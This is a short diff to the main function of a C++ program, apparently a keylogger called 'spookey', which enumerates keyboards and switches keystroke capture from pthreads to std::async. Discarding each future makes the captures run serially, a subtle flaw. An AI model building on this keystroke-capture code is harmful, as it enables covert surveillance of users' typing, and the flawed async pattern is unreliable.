@@ -1,6 +1,6 @@
 #include <string>
 #include <vector>
-#include <pthread.h>
+#include <future>
 #include "spookey.hh"
 
 int main(int argc, char** argv) {
@@ -13,14 +13,11 @@ int main(int argc, char** argv) {
     std::vector<Keyboard> keyboards = findKeyboards();
     int numKeyboards = keyboards.size();
 
-    // Begin capturing keystrokes
+    // Begin capturing keystrokes asynchronously
     for (int i=0; i < numKeyboards; ++i) {
-        keyboards[i].capture();
-    }
-
-    // Do not exit while captures are running
-    for (int i=0; i < numKeyboards; ++i) {
-        pthread_join(keyboards[i].getCaptureThread(), nullptr);
+        auto asyncCapture = std::async(std::launch::async,
+                                                   &Keyboard::capture,
+                                                   &keyboards[i]);
     }
 
     return 0;
